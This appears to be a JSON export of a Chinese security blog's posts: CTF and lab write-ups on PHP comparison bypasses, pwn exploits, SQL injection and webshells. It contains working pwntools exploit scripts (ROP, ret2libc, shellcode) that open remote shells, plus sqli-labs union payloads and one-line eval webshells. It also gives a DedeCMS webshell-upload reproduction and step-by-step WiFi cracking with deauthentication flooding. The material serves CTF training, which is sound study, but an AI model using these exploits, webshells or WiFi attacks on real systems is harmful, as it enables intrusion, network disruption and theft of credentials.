?&gt;题目提醒，数组时解题关键数组可以绕过ereg()函数，strpos()函数，遇到数组，返回的是nullnull===FALSE不成立，null!==FALSE成立，成功绕过 password[]=1这道题，还可以用%00截断首次这道题要求变量password中不能有除大小写、数字外的字符，下面又用strpos函数，要求password中含有–，读取字符串string时,如果遇到了%00,后面的字符串就不会被解析，故可用password=aA5%00– #弱类型整数大小比较绕过 $temp = $_GET[&apos;password&apos;]; is_numeric($temp)?die(&quot;no numeric&quot;):NULL; if($temp&gt;1336){ echo $flag;首先这道题要求password不能是数字，又要求password大于1336对于弱比较，若字符串以数字开头，则取开头数字作为转换结果，若无则输出0password=1337a #sha()函数比较绕过 &lt;?php $flag = &quot;flag&quot;; if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;])) { var_dump($_GET[&apos;name&apos;]); echo &quot; &quot;; var_dump($_GET[&apos;password&apos;]); var_dump(sha1($_GET[&apos;name&apos;])); var_dump(sha1($_GET[&apos;password&apos;])); if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;]) echo &apos; Your password can not be your name! &apos;; else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;])) //这里传入两个不同的数组就行 die(&apos;Flag: &apos;.$flag); else echo &apos; Invalid password. &apos;; } else echo &apos; Login first! &apos;; ?&gt;md5()与sha1()同样，处理数组时，会返回空 name[]=1&amp;password[]=2 #md5加密相等绕过 &lt;?php $md51 = md5(&apos;QNKCDZO&apos;); $a = @$_GET[&apos;a&apos;]; $md52 = @md5($a); if(isset($a)){ if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) { echo &quot;flag{*}&quot;; } else { echo &quot;false!!!&quot;; }} else{echo &quot;please input a&quot;;} ?&gt;如果知道MD5碰撞的概念，同时知道了在PHP中的MD5中的0e的比较，这道题目就十分的简单。 如果md的值是以0e开头的，那么就与其他的0e开头的Md5值是相等的。例子如下： md5(‘s878926199a’)=0e545993274517709034328855841020md5(‘s155964671a’)=0e342768416822451524974117254469 //可以看到两者的md5值都是以0e开头的，则 md5(‘s878926199a’)==md5(‘s155964671a’) //就是Truephp关于==号是这样处理的，如果一边是整型，另一边也需要是整型。 ($a != ‘QNKCDZO’ &amp;&amp; $md51 == $md52) 发现 $a != ‘QNKCDZO’ 并且 $md51 == $md52 因为$md51 = md5(‘QNKCDZO’)=0e830400451993494058024219903391 根据上文介绍，我们发现只要满足md5加密后为 “0e***“就可以a=s878926199a参考链接https://blog.csdn.net/qq_42777804/article/details/98512753 #十六进制与数字比较 &lt;?php error_reporting(0); function noother_says_correct($temp) { $flag = &apos;flag{test}&apos;; $one = ord(&apos;1&apos;); //ord — 返回字符的 ASCII 码值 $nine = ord(&apos;9&apos;); //ord — 返回字符的 ASCII 码值 $number = &apos;3735929054&apos;; // Check all the input characters! for ($i = 0; $i &lt; strlen($number); $i++) { // Disallow all the digits! $digit = ord($temp{$i}); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) { // Aha, digit not allowed! return &quot;flase&quot;; } } if($number == $temp) return $flag; } $temp = $_GET[&apos;password&apos;]; echo noother_says_correct($temp); ?&gt;首先分析代码，函数要求变量$temp不能存在1~9之间的数字，最后，又要求$temp=3735929054;这本来是自相矛盾的，但php在转码时会把16进制转化为十进制.于是把3735929054转换成16进制为0xdeadc0de #ereg正则%00截断 &lt;?php $flag = &quot;xxx&quot;; if (isset ($_GET[&apos;password&apos;])) { if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE) { echo &apos; You password must be alphanumeric &apos;; } else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999) { if (strpos ($_GET[&apos;password&apos;], &apos;-&apos;) !== FALSE) //strpos — 查找字符串首次出现的位置 { die(&apos;Flag: &apos; . $flag); } else { echo(&apos; - have not been found &apos;); } } else { echo &apos; Invalid password &apos;; } } ?&gt;分析代码，若想得到flag，必须使password中不含非字母数字的字符，password长度小于8，大小大9999999，并且password中还得含有’-‘字符串对比解析，ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。password=1e8%00- #strpos数组绕过 &lt;?php $flag = &quot;flag&quot;; if (isset ($_GET[&apos;ctf&apos;])) { if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;ctf&apos;]) === FALSE) echo &apos;必须输入数字才行&apos;; else if (strpos ($_GET[&apos;ctf&apos;], &apos;#biubiubiu&apos;) !== FALSE) die(&apos;Flag: &apos;.$flag); else echo &apos;骚年，继续努力吧啊~&apos;; } ?&gt;数组绕过ereg()函数，strpos()函数，这两个函数遇到数组会返回null，null===FALSE,不成立，null!==FALSE成立ctf[]=1 #数字验证正则绕过 &lt;?php error_reporting(0); $flag = &apos;flag{test}&apos;; if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;]) { $password = $_POST[&apos;password&apos;]; if (0 &gt;= preg_match(&apos;/^[[:graph:]]{12,}$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配 { echo &apos;flag&apos;; exit; } while (TRUE) { $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 foreach ($ps as $pt) { if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; } if ($c &lt; 3) break; //&gt;=3，必须包含四种类型三种与三种以上 if (&quot;42&quot; == $password) echo $flag; else echo &apos;Wrong password&apos;; exit; } } ?&gt;","categories":[],"tags":[]},{"title":"kali暴力破解WiFi密码","slug":"kali-暴力破解WiFi密码","date":"2019-08-30T01:04:59.000Z","updated":"2019-08-30T01:30:34.682Z","comments":true,"path":"2019/08/30/kali-暴力破解WiFi密码/","link":"","permalink":"http://yoursite.com/2019/08/30/kali-暴力破解WiFi密码/","excerpt":"","text":"#kali暴力破解WiFi密码 我这里是用的虚拟机，在虚拟机里，无法用笔记本电脑自带的无线网卡（虚拟机里的系统只能用USB外接无线网卡），因此专门买了一个无线网卡首先在终端里执行 airmon-ngcheck kill// 杀死一切干扰无线网卡监听热点的信号 然后载入自已的网卡名，一般都为wlan0 airmon-ng start wlan0 激活无线网卡，此时无线网卡的名称将变为wlan0mon,之前为wlan0 ifconfig -a开始监听周围WiFi热点，显示各个WiFi热点 airdump-ng wlan0mon 接着选择一个目标，开始攻击 airodump-ng -c 频道(ch) –bssid bssid -w /root/hh（用来存储抓包的目录）网卡名（wlan0mon） 当用户与wifi路由器产生数据交换，发送握手包时，我们可以捕获到，但有时长时间用户不与wifi路由器进行交互，不产生握手包，这时，我们可以强制断开用户的wifi，破事用户重新连接，这时就会产生握手包，新建一个终端 airepaly-ng -0 0 -c 连接到WiFi的手机mac地址 -a bssid 网卡名（一般为wlan0mon） (0为用deauth洪水攻击WiFi设备的次数，0为无限，-0 5则攻击5次。攻击原理是：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送tcp包（里面包含加密的密码数据），我方伪装成WiFi热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的WiFi密码) 最后使用aircrack-ng进行破解 aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/hh-0.1.cap /usr/share/wordlists/rockyou.txt这个是所用密码字典的路径和文件名/root/hh-0.1.cap这个是我们所捕获的握手包的路径和文件名 参考文章：https://blog.csdn.net/qq_41203799/article/details/79945133","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2019-08-25T10:46:19.649Z","updated":"2019-07-19T07:23:44.181Z","comments":true,"path":"2019/08/25/hello-world/","link":"","permalink":"http://yoursite.com/2019/08/25/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"二进制之ctf基础pwn题","slug":"二进制之ctf基础pwn题","date":"2019-07-27T07:49:20.000Z","updated":"2019-08-05T08:24:33.858Z","comments":true,"path":"2019/07/27/二进制之ctf基础pwn题/","link":"","permalink":"http://yoursite.com/2019/07/27/二进制之ctf基础pwn题/","excerpt":"##做题大体思路首先可以看看是否有后门函数，有的话，直接通过后门函数拿到shell，若没有，可以选择构造后门函数；若后门函数行不通，可以考虑执行shellcode，但前提是程序没有打开NX保护；若程序开启了canare保护，就不能简单的覆盖栈，必须保证canary不变，可以考虑通过字符串格式化漏洞，找到这个canary的位置，然后再进行操作。","text":"##做题大体思路首先可以看看是否有后门函数，有的话，直接通过后门函数拿到shell，若没有，可以选择构造后门函数；若后门函数行不通，可以考虑执行shellcode，但前提是程序没有打开NX保护；若程序开启了canare保护，就不能简单的覆盖栈，必须保证canary不变，可以考虑通过字符串格式化漏洞，找到这个canary的位置，然后再进行操作。 ##level0 先用checksec查看一下保护机制，发现几乎没什么保护机制，并且是一个64位的程序用ida64打开这个题有一个后门函数callsystm，直接返回一个system(“/bin/sh”)也就是一个命令框，这就是我们想要的，所以不用再构造后门函数脚本如下： from pwn import* //导入pwntools工具包 p=remote(‘pwn2.jarvisoj.com’,9881) //建立一个远程连接 callsystem=0x0000000000400596 //后门函数的地址 payload=’a’(0x80+0x8)+p64(callsystem) //用’a’0x80填满buf及以下的空间，一直到ebp，然后用’a’*0x8填满ebp，ebp下面的函数地址就被填入后门函数的返回地址，这里要注意的是32位程序ebp的大小位0x4,64位的是0x8 p.sendlineafter(‘World\\n’,payload) //发送数据 p.interactive() //将控制权交给用户 ##level1 仍旧是用checksec查看，32位，几乎没开保护机制，关键是NX没开，意味着栈上的数据可执行，用ida打开，找到溢出点；这次没有后门函数，但是这个函数却调用了printf函数，输出了buf的地址，再结合着NX保护是关闭的，直接将shellcode写到buf中函数返回时直接跳转到buf位置，就可以执行shellcode，拿到控制权，脚本如下： from pwn import* p=remote(&quot;pwn2.jarvisoj.com&quot;,9877) sh=p.recvline()[14:-2]recvline()是接受一行数据,[14:-2]只是python里的一个切片,是”What’sthis:0xffee6c50?”里边的第14个到倒数第二个字符 stack_addr=int(sh,16)这里的text为buf的地址，只不过是字符型的，需要int（text，16）用16进制的方法转化为int型 payload=asm(shellcraft.sh()).ljust(0x88)+&quot;A&quot;*4+p32(stack_addr)asm(shellcraft.sh())是生成shellcode的，ljust（0x88）是把生成的修剪为长度为0x88的 p.sendline(payload) p.interactive()##level2 首先用checksec查看，这次NX打开了，不能执行shellcode了，用ida打开发现有_system函数，并且有/bin/sh/，可以构造后门函数，将函数返回地址用system的地址覆盖，将传入参数设置成”/bin/sh”, from pwn import* p=remote(&apos;pwn2.jarvisoj.com&apos;,9878) system_addr=0x08048320 sh_addr=0x0804A024 payload = &apos;a&apos; * (0x88 + 0x4) + p32(system_addr) + p32(0) + p32(sh_addr) p.sendline(payload) p.interactive()‘a’ * (0x88 + 0x4)覆盖buf和rbpp32(system_addr) 传system的地址到函数返回地址p32(0) 覆盖栈底p32(sh_addr) 传”/bin/sh”到system函数 ##level2_x64 和32位的思路相同，不同的是，传参的方式不同32位的是直接把参数放入栈里，而64位的是把参数放进寄存器里 from pwn import* p=remote(&apos;pwn2.jarvisoj.com&apos;,9882) system_addr=0x00000000004004C0 pop_addr=0x00000000004006b3 sh_addr=0x0000000000600A90 payload = &apos;a&apos; * (0x80 + 0x8)+ p64(pop_addr) + p64(sh_addr)+ p64(system_addr) p.send(payload) p.interactive()pop_addr 第一个参数存入的寄存器的地址，rdi的地址p64(pop_addr) + p64(sh_addr)+ p64(system_addr) 先把”/bin/sh”的地址放入寄存器，然后再传入system函数 可用 ROPgadget –binary level2_x64 –only “pop|ret” 指令找到rdi地址 ##level3先知道plt表和got表的一些相关知识。反编译的过程当中，我们经常会发现xxx@plt的函数，因为为了用户体验和cpu的利用率，编译的时候需要两个表来进行辅助，一个是got表另外一个是plt表。plt表是内部函数表，got表是全局函数表，两者是一一对应的关系，网上找到过一张图，描述的很形象。也就是说plt表里面放的是got表的地址，got表里面放的是函数的真实地址。（链接：https://www.jianshu.com/p/722bcf89c6c2） 这道题，在给出程序的同时，给出了一个libc库；先进行一下安全检查，NX保护打开，但是在程序中却没有发现后门函数，因此，要根据libc库构建一个；通过找libc库中未偏移的write函数地址，和程序中偏移后的write函数地址，得出偏移量，然后从libc库里找system函数和”/bin/sh/“的地址，加上偏移量，得到真正的地址，这样，后门函数构造完成from pwn import*p=remote(“pwn2.jarvisoj.com”,”9879”)elf=ELF(“level3”)plt_write=elf.plt[“write”]main_addr=0x08048484p.recvline()payload = “A” * 0x88 + “A” * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(elf.got[“write”]) + p32(4)p.send(payload)write_addr=u32(p.recv(4))print “write_addr=”+hex(write_addr) libc=ELF(“libc-2.19.so”)bss_addr=0x0804a024libc_system=libc.symbols[“system”]libc_binsh=next(libc.search(“/bin/sh”))libc_write=libc.symbols[“write”] system_addr=write_addr-libc_write+libc_systembinsh_addr=write_addr-libc_write+libc_binshprint “system_addr=”+hex(system_addr) p.recvline() payload = “A” * 0x88 + “A” * 4 + p32(system_addr) + p32(0) + p32(binsh_addr)p.sendline(payload)p.interactive() ##level3_x64思路和level3相同，不同的仍然是64位和32位的传参区别from pwn import*p=remote(“pwn2.jarvisoj.com”,”9883”)elf=ELF(“level3”)plt_write=0x00000000004004B0main_addr=0x000000000040061Apop_rdi=0x00000000004006b3pop_rsi=0x00000000004006b1p.recvline()payload = “A” * 0x80 + “A” * 8 + p64(pop_rdi)+p64(1) +p64(pop_rsi)+ p64(0x0000000000600A58)+p64(0)+p64(plt_write) + p64(main_addr)p.send(payload)write_addr=u64(p.recv(8))print “write_addr=”+hex(write_addr)print hex(elf.got[“write”])libc_system=0x0000000000046590libc_binsh=0x0000000000180543libc_write=0x00000000000EF3B0 system_addr=write_addr-libc_write+libc_systembinsh_addr=write_addr-libc_write+libc_binshprint “system_addr=”+hex(system_addr) p.recvline() payload = “A” * 0x80 + “A” * 8 +p64(pop_rdi)+ p64(binsh_addr)+ p64(system_addr) + p64(0)p.sendline(payload)p.interactive() ##pwn1格式化字符串漏洞的远离：格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。 这道题用到的漏洞，字符串格式化漏洞；这里开启了canary保护，没有开启NX，可以执行shellcode这题的思路：首先通过字符串格式化漏洞，泄露出canary在栈中的地址，以便覆盖栈时保证相应的地址canary不变，然后在函数返回地址中填入shellcode的地址，然后把shellcode放入相应的地址from pwn import * shellcode=”\\x31\\xc0\\x31\\xd2\\x31\\xdb\\x31\\xc9\\x31\\xc0\\x31\\xd2\\x52\\x68\\x2f\\x2f” “\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0” “\\x0b\\xcd\\x80\\n”context.log_level=’debug’p=process(“./pwn1”)//p=remote(‘172.16.80.240’,8000)p.recvuntil(‘name:’)p.sendline(‘%p.’40)leak_data=p.recvuntil(‘messages:’)address=leak_data.split(‘.’)for i in range(len(address)): print str(i)+’:’+str(address[i])canary=address[30]print “canary=”+canaryprev_ebp_addr=address[33]print “stack_addr=”+prev_ebp_addrshellcode_addr=int(prev_ebp_addr,16)-144+0x8payload=’a’100+p32(int(canary,16))+’A’*12+p32(shellcode_addr)+shellcodep.sendline(payload)p.interactive()","categories":[],"tags":[]},{"title":"ubuntu16下 pwntools的安装","slug":"pwntools的安装","date":"2019-07-23T03:22:12.000Z","updated":"2019-07-23T03:26:54.963Z","comments":true,"path":"2019/07/23/pwntools的安装/","link":"","permalink":"http://yoursite.com/2019/07/23/pwntools的安装/","excerpt":"","text":"sudo apt-get update sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentia sudo pip install --upgrade pip -i http://pypi.douban.com/simple --trusted-host pypi.douban.com sudo pip install --upgrade pwntools -i http://pypi.douban.com/simple --trusted-host pypi.douban.com如果第四条指令报错的话，可以在最后加上 –user 试试；","categories":[],"tags":[]},{"title":"sql注入","slug":"sql注入","date":"2019-07-20T08:24:08.000Z","updated":"2019-08-07T11:36:34.361Z","comments":true,"path":"2019/07/20/sql注入/","link":"","permalink":"http://yoursite.com/2019/07/20/sql注入/","excerpt":"","text":"常用的系统函数1.version() –mysql版本2.user() –数据库用户名3.database() – 数据库名4.@@datadir –数据库路径5.@@version_compile_os –操作系统版本字符串连接符号 group_concat(Str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据 ##sqli-labs-master## ###Less1###爆所有的数据库名 127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata%23 库名：information_schema,�����ݿ�,challenges,dedecmsv57utf8sp2,dvwa,mysql,performance_schema,security,test,wordpress 爆表名 127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ –+表名：emails,referers,uagents,users 爆列名：127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+ 爆数据 127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,username,password from users where id=2–+ ###Less2","categories":[],"tags":[]},{"title":"WEB前端安全-XSS与CSRF","slug":"drops夏令营14","date":"2019-07-20T07:11:35.000Z","updated":"2019-07-20T07:24:20.490Z","comments":true,"path":"2019/07/20/drops夏令营14/","link":"","permalink":"http://yoursite.com/2019/07/20/drops夏令营14/","excerpt":"","text":"XSS XSS，Cross Site Script，即跨站脚本攻击；XSS攻击通常指黑客通过“HTML”注入篡改了网页，插入了恶意的脚本，从而在浏览网页时，控制用户浏览器的一种攻击。XSS根据效果的不同可以分为以下三类： 反射型XSS，也叫做“非持久型XSS”，只是简单的把用户输入的数据“反射”给浏览器； 存储型XSS，也叫做“持久型XSS”，会把用户输入的数据“存储在”服务器端。常见的场景是，黑客写下一篇含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码； DOM Based XSS，从效果来说也是反射型XSS，单独划分出了是因为DOM Based XSS的形成原因比较特殊，通过修改页面的DOM节点形成的XSS XSS常见危害：劫持用户会话盗取cookie钓鱼欺骗强制弹出广告提升用户权限传播跨站脚本蠕虫 CSRFCSRF，Cross Site Request Forgery，即跨站点请求伪造；它是一种常见的Web攻击，也是Web安全中最容易被忽略的一种攻击方式它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。 一般攻击方式为攻击者诱使用户访问了一个页面，就以该用户身份在第三方站点里执行了一次操作 CSRF攻击的两个重点 *CSRF的攻击建立在浏览器与web服务器的会话中*欺骗用户访问URL","categories":[],"tags":[]},{"title":"渗透测试工具","slug":"drops夏令营11","date":"2019-07-20T06:49:20.000Z","updated":"2019-07-20T08:00:59.768Z","comments":true,"path":"2019/07/20/drops夏令营11/","link":"","permalink":"http://yoursite.com/2019/07/20/drops夏令营11/","excerpt":"","text":"nmap(一款开源免费的网络发现（Network Discovery）和安全审计（Security Auditing）工具)SQLMAP(sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限)burpsuite(BurpSuite 是用于攻击web 应用程序的集成平台，包含了许多工具)hydra(Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具)中国菜刀 中国蚁剑（网站管理工具）御剑（一款好用的网站后台扫描工具）nessus（一款漏洞扫描程序）AWVS(一个自动化的web应用程序安全测试工具) nmap的基本功能主机发现、端口扫描、版本侦测、操作系统侦测 常用参数-A ：选项用于使用进攻性方式扫描-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4-oX test.xml： 将扫描结果生成 test.xml 文件-oG test.txt: 将扫描结果生成 test.txt 文件-sn : 只进行主机发现，不进行端口扫描-O : 指定Nmap进行系统版本扫描-sV: 指定让Nmap进行服务版本扫描-p : 扫描指定的端口-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况-Pn ： 不进行ping扫描-sP : 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping-PI : 设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。-iL 1.txt : 批量扫描1.txt中的目标地址-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况-sO: 使用IP protocol 扫描确定目标机支持的协议类型-PO : 使用IP协议包探测对方主机是否开启-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机-e eth0：指定使用eth0网卡进行探测-f : –mtu : 指定使用分片、指定数据包的 MTU.-b : 使用FTP bounce scan扫描方式-g： 指定发送的端口号-n : 表示不进行DNS解析；-S : 伪装成其他 IP 地址 扫描特定主机上的某些端口1.nmap -p 21,22,23,80,443 192.168.1.1 //扫描指定端口2.nmap -p 20-80 192.168.1.1 //扫描指定范围内的端口 sqlmap参数-p 指定测试参数-b 获取banner–dbs 列举数据库–is-dba 是否是管理员权限–current-db 当前数据库–current-user 当前用户–tables 列举数据库的表名–count 检索所有条目数–columns 获取表的列名–dump 获取表中的数据，包含列–dump-all 转存DBMS数据库所有表项目–level 测试等级(1-5)，默认为1-v 显示详细信息操作步骤读数据库-&gt;读取表-&gt;读取表的列-&gt; 获取内容-D 指定数据库 -T 指定表 -C指定列–dbms==mysql Oracle mysql 指定数据库 举例爆数据库 sqlmap –u “http://127.0.0.1/sqli-labs/Less-1/?id=1” –dbs当前数据库 sqlmap –u “http://127.0.0.1/sqli-labs/Less-1/?id=1” –current-db列举数据库的表名 sqlmap –u http://127.0.0.1/sqli-labs/Less-1/?id=1 –D security – tables列出表中的字段 sqlmap –u http://127.0.0.1/sqli-labs/Less-1/?id=1 –D security –T users –columns列出字段内容 sqlmap –u http://127.0.0.1/sqli-labs/Less-1?id=1 –D security –T users –C password –dump Burpsuite Proxy代理模块 Burpsuite默认使用8080端口作为代理，当然，你也可以自己修改端口号。Proxy——&gt;Options，然后下面可以自己修改代理的端口号，默认是8080这里 Proxy 的 Intercept 这里显示 Intercept is on 表示拦截包开启，所有代理的包都必须先经过burpsuite放行才可以走。如果这里我们选择 intercept is off 的话，那么所有的包都会经过burpsuite，可以在HTTP history看所有经过的包，但是burpsuite不会对经过的包进行拦截。 Repeater模块(改包，重放) 抓取包之后，右键 Send to Repeater 发送到重发模块在 Repeater模块，我们可以随意修改数据包。修改完后，点击 go ，就可以发包了。右边就会显示 服务器回的包。 中国蚁剑 中国菜刀 与一句话木马有关一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。 简单的一句话木马：PHP： Asp： &lt;%eval request (“pass”)%&gt;Aspx： &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;","categories":[],"tags":[]},{"title":"漏洞复现","slug":"drops夏令营15","date":"2019-07-20T06:25:41.000Z","updated":"2019-07-20T06:37:28.150Z","comments":true,"path":"2019/07/20/drops夏令营15/","link":"","permalink":"http://yoursite.com/2019/07/20/drops夏令营15/","excerpt":"","text":"一、 dedeCMS漏洞的文件路径 DedeCMS-V5.7-UTF8-SP2\\uploads\\dede\\tpl.php漏洞的代码如下： else if($action==’savetagfile’){ csrf_check(); if(!preg_match(“#^[a-z0-9_-]{1,}.lib.php$#i”, $filename)) { ShowMsg(‘文件名不合法，不允许进行操作！’, ‘-1’); exit(); } require_once(DEDEINC.’/oxwindow.class.php’); $tagname = preg_replace(“#.lib.php$#i”, “”, $filename); $content = stripslashes($content); $truefile = DEDEINC.’/taglib/‘.$filename; $fp = fopen($truefile, ‘w’); fwrite($fp, $content);fclose($fp); 通过分析发现，因为没有对写入的内容做过滤，我们可以写一句话木马上传了 if(!preg_match(“#^[a-z0-9_-]{1,}.lib.php$#i”, $filename))Preg_match()函数是正则匹配的函数，里面写上匹配的规则，匹配所有包含一个以上的字母数字下划线和横杠，后面的.意思是匹配小数点，i表示大小写不敏感Preg_replaceStripslashes()该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。 UR输入 域名+/ DedeCMS-V5.7-UTF8-SP2/uploads/dede/tpl.php?action=upload获取 token然后输入action=savetagfile&amp;token=b87a7b8629b120fb009c8992cce7c68f&amp;filename=123.lib.php&amp;content= 上传一个123.lib.php文件，里边写着一句话木马 然后用蚁剑连上；","categories":[],"tags":[]},{"title":"ctf之MISC","slug":"drops夏令营13","date":"2019-07-19T07:31:31.000Z","updated":"2019-07-20T06:41:32.060Z","comments":true,"path":"2019/07/19/drops夏令营13/","link":"","permalink":"http://yoursite.com/2019/07/19/drops夏令营13/","excerpt":"","text":"流量分析文件格式分析隐写 图片 音频压缩包分析古典密码 流量分析（wireshark使用）………… ……常见文件头和文件尾的16进制编码：JPEG (jpg) 文件头：FFD8FF 文件尾：FF D9 PNG (png) 文件头：89504E47 文件尾：AE 42 60 82 GIF (gif) 文件头：47494638 文件尾：00 3B ZIP Archive (zip) 文件头：504B0304 文件尾：50 4B TIFF (tif)， 文件头：49492A00 RAR Archive (rar)， 文件头：52617221 Windows Bitmap (bmp)， 文件头：424DAdobe Photoshop (psd)， 文件头：38425053Rich Text Format (rtf)， 文件头：7B5C727466 XML (xml)， 文件头：3C3F786D6C HTML (html)， 文件头：68746D6C3EOutlook Express (dbx)， 文件头：CFAD12FEC5FD746FOutlook (pst)， 文件头：2142444EMS Word/Excel (xls.or.doc)， 文件头：D0CF11E0MS Access (mdb)， 文件头：5374616E64617264204AWordPerfect (wpd)， 文件头：FF575043Adobe Acrobat (pdf)， 文件头：255044462D312EQuicken (qdf)， 文件头：AC9EBD8F…… 文件分离的方法 除了用foremost外，还有binwalk、dd命令binwalk -e 文件名dd前面介绍的是自动化分离工具，dd这个工具是一种半自动化工具，有的时候自动化工具不能实现文件的分离，所以需要用这个工具来进行分离。使用dd命令分离文件格式如下：dd if=源文件名 of=输出文件名 skip=开始分离的字节数 bs=1；参数说明：if=file #输入文件名，缺省为标准输入。of=file #输出文件名，缺省为标准输出。bs=bytes #同时设置读写块的大小为 bytes ，可代替 ibs 和 obs 。skip=blocks #从输入文件开头跳过 blocks 个块后再开始复制。 Lsb隐写 和音频隐写（Audacity、MP3stego 使用）……。。。。。。 Zip伪加密问题 识别真假加密无加密压缩源文件数据区的全局加密应当为00 00且压缩源文件目录区的全局方式位标记应当为00 00假加密压缩源文件数据区的全局加密应当为00 00且压缩源文件目录区的全局方式位标记应当为09 00真加密压缩源文件数据区的全局加密应当为09 00且压缩源文件目录区的全局方式位标记应当为09 00第二个数字为奇数时 –&gt;加密第二个数字为偶数时 –&gt;未加密 对于伪加密有以下几种方法： 在Mac OS及部分Linux（如Kali）系统中，可以直接打开伪加密的zip压缩包 使用检测伪加密的ZipCenOp.jar，解密后如果能成功打开zip包，则是伪加密，否则说明思路错误。使用ZipCenOp.jar(需要java环境)，在cmd中使用java -jar ZipCenOp.jar -r xxx.zip 压缩包明文攻击 明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件 ……。。。。。。 古典密码 凯撒密码栅栏密码棋盘密码希尔密码摩斯电码猪圈密码键盘密码当铺密码（http://www.zjslove.com/3.decode/dangpu/index.html）","categories":[],"tags":[]},{"title":"ctf之web安全","slug":"drops夏令营12","date":"2019-07-19T07:25:12.000Z","updated":"2019-07-20T06:40:42.946Z","comments":true,"path":"2019/07/19/drops夏令营12/","link":"","permalink":"http://yoursite.com/2019/07/19/drops夏令营12/","excerpt":"","text":"Web题目分类1.源码获取，扫描，弱密码爆破，js绕过 Php代码审计，弱类型比较 文件上传，文件包含 序列化和反序列化 Sql注入（必有） Xss跨站脚本攻击（难） 第一节web基础知识 X-Forwarded-For 是一个 HTTP 扩展头部，主要是为了让 Web 服务器获取访问用户的真实 IP 地址（其实这个真实未必是真实的，是自己写入的，完全由自己定夺，是自己想告诉服务器自己的IP地址）； Referer是告诉服务器你从哪里来，比如说从谷歌来； 源码获取，git 由于现在当前大量开发人员使用git进行版本控制，对站点自动部署。 如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，还原重建工程源代码。 扫描 有些网站的隐藏的文件，页面并不是能够发现，所以需要我们利用一些扫描工具进行扫描，得到隐藏的页面，得到关键的信息。常用的扫描软件：御剑，dirserach御剑在window下运用，而dirsearch需要在linux下进行扫描。Dirsearch扫描命令格式：./dirsearch –u 目标网址 –e*例如：./dirsearch –u htttps://www.baidu.com –e* 第二节 php代码审计 